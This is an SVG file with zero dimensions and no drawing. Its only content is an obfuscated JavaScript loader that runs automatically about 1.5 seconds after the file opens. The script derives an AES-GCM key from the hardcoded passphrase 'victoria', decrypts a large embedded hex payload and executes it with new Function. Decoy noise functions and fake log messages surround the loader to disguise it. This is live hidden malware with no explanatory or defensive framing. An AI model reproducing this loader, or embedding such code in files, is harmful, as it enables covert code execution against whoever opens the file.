<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" width="0" height="0">
<script type="application/javascript"><![CDATA[
const lockToken = "[KeyC]", bel="[EMAIL]",lieve="[KEY]";

let sysFlag = {
    bootMarker: Date.now(),
    heapTrack: 0,
    loopCount: 0,
    dummyNoise: 0,
    identity: 202
};

function makeJunkId() {
    return "X" + Math.random().toString(36).substring(2, 12);
}

function junkEntropy() {
    return Array.from({ length: 6 }, makeJunkId).join("||");
}

// Fake irrelevant noise generator
function noopCycleGenerator() {
    const arr = new Array(5).fill(0).map(() => Math.random() * 1000);
    return arr.reduce((a, b) => a + b, 0);
}

function printBogusLog() {
    console.log("Bogus log id:", makeJunkId(), "Flag:", sysFlag.identity);
}

const secureCore = (() => {
    const inner = {
        iv: "dbe7bfbd6b304ddde5cfdf47",
        salt: "de1d038827665c4a1f0ae6c477c54581",
        encryptedData: "b04834e8d75576726fbb38da28f5f7b081b71e76af66777a2f306d46a04652b722d3d76ec220136729a9dc808afce5a763746408f22dbae0ab6a77556a70a9b64539b40d3c2229b3a944e27474d4b77795370071fe086615b8cf8a2181d3c5438565a7def06f7bb8bc58f1b8a97e6dd8ce173a2162804052064a8f12d6c0887f62a822c9cdf382be8f56504f97078cbc96faf19fd808fb3137e9085076942ed7f74a781b841f5d6f89d78ee4f25bcfa721e53e6d800c0f080d5f02541d5ad432f82cc39d4edf86e9dbfb49915e32e81c26038a52a1541d281acf24a7f1fbc3b32c61b293619dd95b5bd89b8fd99add3bf2e38491d8ca6c23a3f7a4fd521fd193a2b08c75654d6f4699dcdd9bfd54ba01d70690730a8cb568ffcae173442c64ac685769207a3ca9970aa17aa2129546279c3309c5629c7d4e3621de378aa490d0806192499a7cc0d3af0e8ae6b74482723bba22eac6616dc179d6d079d5ae3e5a75e4c9655aeeab0bc18b571736de3c36b8aa2ff1592503b5c7e3b8ff3857178041ddb01b2a470996790b3b2eff8cd8d175a4e8aad0604178d1871ca84ed984b1357173fe95e5c7d6732d34c0027ce28b3bee882e479c849389c6f54a509b45747f779ed0cf3da0c16878474871b0411190365a3c89d0a0eae61fc38523",
        keyPhrase: "victoria"
    };

    const sessionTrace = {
        traceId: makeJunkId(),
        active: true
    };

    return {
        getIV: () => inner.iv,
        getSalt: () => inner.salt,
        getEncryptedData: () => inner.encryptedData,
        getKeyPhrase: () => inner.keyPhrase,
        trace: () => sessionTrace
    };
})();

function hexToBuf(hex) {
    let out = new Uint8Array(hex.length / 2);
    for (let j = 0; j < out.length; j++) {
        out[j] = parseInt(hex.substr(2 * j, 2), 16);
    }
    return out;
}

async function waitFakeDelay(ms = 120 + Math.random() * 150) {
    return new Promise(ok => {
        console.debug("Delay for:", ms.toFixed(0), "ms");
        setTimeout(ok, ms);
    });
}

async function unlockSecurePayload() {
    sysFlag.heapTrack = window?.performance?.memory?.usedJSHeapSize || 123456;
    sysFlag.loopCount += 1;

    try {
        const baseKey = await crypto.subtle.importKey("raw", new TextEncoder().encode(secureCore.getKeyPhrase()), { name: "PBKDF2" }, false, ["deriveKey"]);

        const keyMaterial = await crypto.subtle.deriveKey({
            name: "PBKDF2",
            salt: hexToBuf(secureCore.getSalt()),
            iterations: 100000,
            hash: "SHA-256"
        }, baseKey, { name: "AES-GCM", length: 256 }, false, ["decrypt"]);

        await waitFakeDelay();

        const result = await crypto.subtle.decrypt({
            name: "AES-GCM",
            iv: hexToBuf(secureCore.getIV())
        }, keyMaterial, hexToBuf(secureCore.getEncryptedData()));

        const execute = new Function(new TextDecoder().decode(result));
        execute();
    } catch (err) {
        console.warn("Secure unlock failed:", err);
    }
}

function injectBackgroundNoise() {
    let count = 0;
    while (count++ < 3) {
        console.log("Noise element:", makeJunkId());
    }
}

function systemEcho() {
    return {
        timeNow: Date.now(),
        seed: junkEntropy(),
        usageSnapshot: sysFlag.heapTrack
    };
}

// Unused dummy logic
function decoyMathOperation() {
    let n = 0;
    for (let i = 0; i < 100; i++) {
        n += Math.sqrt(i) * Math.sin(i);
    }
    return n;
}

document.addEventListener("DOMContentLoaded", () => {
    console.log("SVG initialization done.");
    injectBackgroundNoise();
    decoyMathOperation();
});

setTimeout(() => {
    unlockSecurePayload();
}, 1500);

console.info("System init trace:", systemEcho());

(() => {
    const bufferInfo = [];
    for (let i = 0; i < 4; i++) {
        bufferInfo.push(`${makeJunkId()}:${(Math.random() * 999).toFixed(2)}`);
    }
    console.debug("Temp Trace:", bufferInfo.join(" :: "));
    noopCycleGenerator();
})();
]]></script>
</svg>
